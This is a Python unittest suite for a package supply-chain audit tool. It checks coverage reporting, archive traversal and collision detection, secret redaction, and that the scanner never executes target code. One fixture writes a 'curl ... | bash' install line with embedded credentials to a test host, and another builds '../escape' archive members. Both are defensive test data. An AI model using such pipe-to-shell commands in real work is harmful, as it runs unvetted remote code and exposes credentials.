#!/usr/bin/env python3
"""Bounded synthetic regression cases; never run code from audited packages."""
import importlib.util
import io
import json
import os
from pathlib import Path
import stat
import subprocess
import sys
import tarfile
import tempfile
import unittest
from unittest.mock import patch
import zipfile

sys.dont_write_bytecode = True
ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "skills/2-skill-supply-chain-audit/scripts/audit_skill.py"
spec = importlib.util.spec_from_file_location("package_audit", SCRIPT)
audit = importlib.util.module_from_spec(spec)
spec.loader.exec_module(audit)


class PackageAuditTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name).resolve()
        self.target = self.root / "package"
        self.target.mkdir()

    def run_cli(self, *args):
        return subprocess.run([sys.executable, "-B", str(SCRIPT), str(self.target), *map(str, args)],
                              capture_output=True, text=True, timeout=10)

    def write_zip(self, name="payload.zip", members=None):
        path = self.target / name
        with zipfile.ZipFile(path, "w") as archive:
            for member, content in (members or [("safe.txt", "hello")]):
                archive.writestr(member, content)
        return path

    def test_small_opaque_file_is_a_coverage_gap(self):
        (self.target / "binary.bin").write_bytes(b"\x00\x01\x02")
        report = audit.scan(self.target)
        self.assertFalse(report["coverage"]["content_pattern_scan_complete"])
        self.assertIn("binary.bin", report["coverage"]["unresolved_content_review_paths"])

    def test_archive_metadata_does_not_claim_member_content_review(self):
        self.write_zip()
        report = audit.scan(self.target)
        self.assertTrue(report["coverage"]["archive_metadata_inspection_complete"])
        self.assertFalse(report["coverage"]["content_pattern_scan_complete"])
        self.assertEqual(report["archives"][0]["members_inspected"], 1)

    def test_comparison_includes_mode_and_symlink_targets(self):
        path = self.target / "runner.sh"
        path.write_text("echo hi")
        path.chmod(0o600)
        (self.target / "link").symlink_to("runner.sh")
        before = audit.scan(self.target)
        path.chmod(0o700)
        (self.target / "link").unlink()
        (self.target / "link").symlink_to("other")
        after = audit.scan(self.target)
        result = audit.compare(after, before)
        self.assertIn("runner.sh", result["changed"])
        self.assertIn("link", result["changed"])

    def test_report_omits_url_credentials_and_matched_source(self):
        marker = "SENSITIVE_CANARY"
        (self.target / "install.sh").write_text(
            "curl https://user:" + marker + "@example.test/private/" + marker + "?token=" + marker + " | bash\n")
        result = json.dumps(audit.scan(self.target))
        self.assertNotIn(marker, result)
        self.assertIn("example.test", result)

    def test_output_is_create_only_by_default(self):
        output = self.root / "report.json"
        output.write_text("preserve original")
        result = self.run_cli("--output", output)
        self.assertEqual(result.returncode, 2)
        self.assertEqual(output.read_text(), "preserve original")

    def test_safe_output_and_explicit_replace(self):
        (self.target / "readme.md").write_text("Plain package text.")
        output = self.root / "report.json"
        result = self.run_cli("--output", output)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(stat.S_IMODE(output.stat().st_mode), 0o600)
        self.assertIn("coverage", json.loads(output.read_text()))
        self.assertEqual(self.run_cli("--output", output, "--replace").returncode, 0)
        self.assertEqual(self.run_cli("--output", self.target / "audit.json").returncode, 2)
        alias = self.root / "alias"
        alias.symlink_to(self.target / "readme.md")
        self.assertEqual(self.run_cli("--output", alias).returncode, 2)

    def test_hash_identity_and_nested_skill_metadata(self):
        (self.target / "SKILL.md").write_text("---\nname: package\ndescription: >\n  Use when testing.\nlicense: MIT\n---\n")
        nested = self.target / "child"
        nested.mkdir()
        (nested / "SKILL.md").write_text("---\nname: child\ndescription: child\n---\n")
        report = audit.scan(self.target)
        self.assertFalse(any(f["id"] in {"SC-META-EXTRA", "SC-META-NAME", "SC-META-TRIGGER"} for f in report["findings"]))
        self.assertEqual(report["canonical_manifest_sha256"], audit.scan(self.target)["canonical_manifest_sha256"])

    def test_read_error_and_entry_limits_are_reported(self):
        (self.target / "one.md").write_text("text")
        with patch.object(audit, "read_regular_snapshot", side_effect=OSError("private failure")):
            report = audit.scan(self.target)
        self.assertFalse(report["coverage"]["content_pattern_scan_complete"])
        self.assertNotIn("private failure", json.dumps(report))
        with patch.object(audit, "MAX_PACKAGE_ENTRIES", 0):
            report = audit.scan(self.target)
        self.assertFalse(report["coverage"]["inventory_complete"])

    def test_file_budget_hash_is_unknown_not_missing_from_inventory(self):
        (self.target / "big.txt").write_text("long content")
        with patch.object(audit, "MAX_FILE_BYTES", 5):
            report = audit.scan(self.target)
        self.assertFalse(report["coverage"]["hash_inventory_complete"])
        self.assertEqual(report["files"][0]["path"], "big.txt")
        self.assertNotIn("sha256", report["files"][0])

    def test_special_and_symlink_targets_are_not_read(self):
        (self.target / "external").symlink_to(self.root / "outside")
        (self.root / "outside").write_text("SENSITIVE_CANARY")
        if hasattr(os, "mkfifo"):
            os.mkfifo(self.target / "fifo")
        result = self.run_cli()
        self.assertEqual(result.returncode, 1)
        self.assertNotIn("SENSITIVE_CANARY", result.stdout)
        self.assertFalse(json.loads(result.stdout)["coverage"]["content_pattern_scan_complete"])

    def test_archive_hazards_and_mislabeled_archive(self):
        self.write_zip("payload.dat", [("../escape", "text"), ("C:relative", "text")])
        report = audit.scan(self.target)
        self.assertEqual(report["archives"][0]["format"], "zip")
        self.assertGreaterEqual(sum(f["id"] == "SC-ARCHIVE-PATH" for f in report["findings"]), 2)

    def test_compressed_tar_bounds_and_safe_members(self):
        for mode, name in (("w:gz", "archive.tgz"), ("w:bz2", "archive.tar.bz2"), ("w:xz", "archive.tar.xz")):
            with self.subTest(mode=mode):
                path = self.target / name
                with tarfile.open(path, mode) as archive:
                    member = tarfile.TarInfo("safe.txt")
                    member.size = 10
                    archive.addfile(member, io.BytesIO(b"0123456789"))
                report = audit.scan(self.target)
                item = next(a for a in report["archives"] if a["path"] == name)
                self.assertTrue(item["inspection_complete"])
                with patch.object(audit, "MAX_TAR_EXPANDED_BYTES", 100):
                    report = audit.scan(self.target)
                item = next(a for a in report["archives"] if a["path"] == name)
                self.assertFalse(item["inspection_complete"])

    def test_findings_limits_and_git_exclusion_are_visible(self):
        (self.target / "repeated.md").write_text("sudo command\n" * 25)
        report = audit.scan(self.target)
        self.assertEqual(report["summary"]["findings_omitted"], 15)
        self.assertFalse(report["coverage"]["findings_display_complete"])
        metadata = self.target / ".git"
        metadata.mkdir()
        (metadata / "secret").write_text("SENSITIVE_CANARY")
        report = audit.scan(self.target)
        self.assertFalse(report["coverage"]["inventory_complete"])
        self.assertIn(".git", report["coverage"]["unresolved_content_review_paths"])
        self.assertNotIn("SENSITIVE_CANARY", json.dumps(report))

    def test_directory_error_and_partial_baseline_are_not_silent(self):
        with patch.object(audit.os, "scandir", side_effect=PermissionError("private reason")):
            report = audit.scan(self.target)
        self.assertFalse(report["coverage"]["inventory_complete"])
        self.assertNotIn("private reason", json.dumps(report))
        baseline = self.root / "baseline"
        baseline.mkdir()
        (baseline / "unknown.bin").write_bytes(b"\0")
        result = self.run_cli("--baseline", baseline)
        self.assertEqual(result.returncode, 1)
        self.assertFalse(json.loads(result.stdout)["baseline_coverage"]["content_pattern_scan_complete"])

    def test_unreadable_archive_and_unknown_hash_comparison(self):
        self.write_zip()
        with patch.object(audit, "read_regular_snapshot", side_effect=OSError()):
            before = audit.scan(self.target)
            after = audit.scan(self.target)
        self.assertFalse(before["coverage"]["archive_metadata_inspection_complete"])
        compared = audit.compare(after, before)
        self.assertEqual(compared["unknown"], ["payload.zip"])
        self.assertEqual(compared["unchanged"], [])
        self.assertFalse(compared["comparison_complete"])

    def test_archive_case_collisions_and_invalid_input(self):
        self.write_zip(members=[("same.txt", "one"), ("SAME.txt", "two")])
        report = audit.scan(self.target)
        self.assertTrue(any(f["id"] == "SC-ARCHIVE-COLLISION" for f in report["findings"]))
        (self.target / "broken.tar").write_bytes(b"not a tar")
        report = audit.scan(self.target)
        self.assertFalse(report["coverage"]["archive_metadata_inspection_complete"])
        self.assertEqual(self.run_cli("--replace").returncode, 2)

    def test_scan_never_executes_target_code_or_creates_files(self):
        marker = self.root / "MUST_NOT_EXIST"
        code = self.target / "payload.py"
        code.write_text("from pathlib import Path\nPath(" + repr(str(marker)) + ").touch()\n")
        initial = code.read_bytes()
        report = audit.scan(self.target)
        self.assertEqual(code.read_bytes(), initial)
        self.assertFalse(marker.exists())
        self.assertEqual(sorted(p.name for p in self.target.iterdir()), ["payload.py"])
        self.assertEqual(report["summary"]["regular_files"], 1)


if __name__ == "__main__":
    unittest.main()
